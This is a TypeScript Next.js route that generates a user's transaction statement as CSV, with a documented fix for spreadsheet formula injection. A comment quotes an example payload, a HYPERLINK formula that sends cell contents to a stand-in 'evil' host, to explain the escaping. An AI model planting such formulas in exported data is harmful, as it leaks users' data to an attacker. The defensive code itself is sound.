/**
 * Generate Statement: download the user's transaction history for a chosen
 * period, as CSV.
 *
 * Ported from `TransactionController::statement` — the CSV half only. The
 * Laravel version also generated a PDF via barryvdh/laravel-dompdf; that half
 * is NOT ported here. This app has no PDF-rendering dependency yet (Puppeteer,
 * @react-pdf/renderer, etc. are all a real size/cold-start tradeoff on
 * serverless), so `file_type=pdf` currently 501s rather than silently
 * returning the wrong format. See the TODO below before wiring it up.
 *
 * Next.js route convention: this file must live at the literal path
 * `transactions/statement/route.ts`, a sibling of the dynamic
 * `transactions/[id]/route.ts` — Next resolves the static segment first, so
 * there is no risk of "statement" being swallowed as an `:id` value (unlike
 * Laravel, where route declaration ORDER decides this and getting it wrong is
 * a real footgun).
 */

import { z } from "zod";
import { prisma } from "@/server/db";
import { requireUser } from "@/server/auth";
import { HttpError, handle, parseQuery } from "@/server/http";
import { resolveSubjectAmounts, transactionLabel } from "@/server/subjects";

const schema = z
	.object({
		file_type: z.enum(["pdf", "csv"]).default("pdf"),
		start_date: z.string().date().optional(),
		end_date: z.string().date().optional(),
		// Aliases accepted by the Laravel version.
		from: z.string().date().optional(),
		to: z.string().date().optional(),
	})
	.transform((data) => ({
		fileType: data.file_type,
		from: data.start_date ?? data.from ?? null,
		to: data.end_date ?? data.to ?? null,
	}))
	.refine((data) => !data.from || !data.to || data.to >= data.from, {
		message: "end_date must be on or after start_date.",
		path: ["end_date"],
	});

/**
 * RFC 4180 quoting, plus formula-injection defence.
 *
 * Excel and Sheets execute any cell whose text begins with `=`, `+`, `-`, `@`,
 * tab or CR. Group names are free-text, so a circle named
 * `=HYPERLINK("http://evil/"&A1,"click")` was written verbatim into the Group
 * column and ran when the user opened their own statement. Prefixing an
 * apostrophe makes the spreadsheet treat the cell as text. RFC-4180 quoting
 * alone does NOT prevent this — the quotes are stripped before evaluation.
 */
function csvField(value: string | null | undefined): string {
	let text = value ?? "";
	if (/^[=+\-@\t\r]/.test(text)) text = `'${text}`;
	if (!/[",\n]/.test(text)) return text;
	return `"${text.replace(/"/g, '""')}"`;
}

export async function GET(request: Request) {
	return handle(async () => {
		const user = await requireUser(request);
		const { fileType, from, to } = parseQuery(request, schema);

		if (fileType === "pdf") {
			// Honest 501 rather than silently substituting CSV or a broken PDF.
			// The frontend's Generate Statement screen should keep the PDF
			// option disabled, or catch this status, until a rendering path is
			// chosen and wired up here.
			throw new HttpError(
				501,
				"PDF statements are not available yet. Request a CSV statement instead.",
			);
		}

		const transactions = await prisma.transaction.findMany({
			where: {
				userId: user.id,
				...((from || to) && {
					createdAt: {
						...(from && { gte: new Date(`${from}T00:00:00.000Z`) }),
						// Inclusive end date: bound at the START of the NEXT day
						// rather than end-of-day string math, so no timezone can
						// silently shave off the last day's rows.
						...(to && {
							lt: new Date(
								new Date(`${to}T00:00:00.000Z`).getTime() + 86_400_000,
							),
						}),
					},
				}),
			},
			include: { group: { select: { name: true } } },
			orderBy: { createdAt: "desc" },
		});

		const amounts = await resolveSubjectAmounts(transactions);

		const lines = [
			["Date", "Type", "Group", "Status", "Amount", "Stellar Tx Hash", "Explorer URL"]
				.map(csvField)
				.join(","),
			...transactions.map((tx) =>
				[
					tx.createdAt.toISOString().replace("T", " ").slice(0, 19),
					// NOT `tx.type` — that reads "payout" for both an incoming circle
					// payout and an outgoing withdrawal.
					transactionLabel(tx),
					tx.group?.name ?? "",
					tx.status,
					amounts.get(tx.id) ?? "",
					tx.stellarTxHash ?? "",
					tx.explorerUrl ?? "",
				]
					.map(csvField)
					.join(","),
			),
		];

		// \r\n per RFC 4180; some spreadsheet importers mis-split rows on a bare \n.
		const csv = lines.join("\r\n") + "\r\n";
		const filename = `saji-statement-${new Date().toISOString().slice(0, 10)}.csv`;

		return new Response(csv, {
			status: 200,
			headers: {
				"Content-Type": "text/csv; charset=utf-8",
				"Content-Disposition": `attachment; filename="${filename}"`,
			},
		});
	});
}
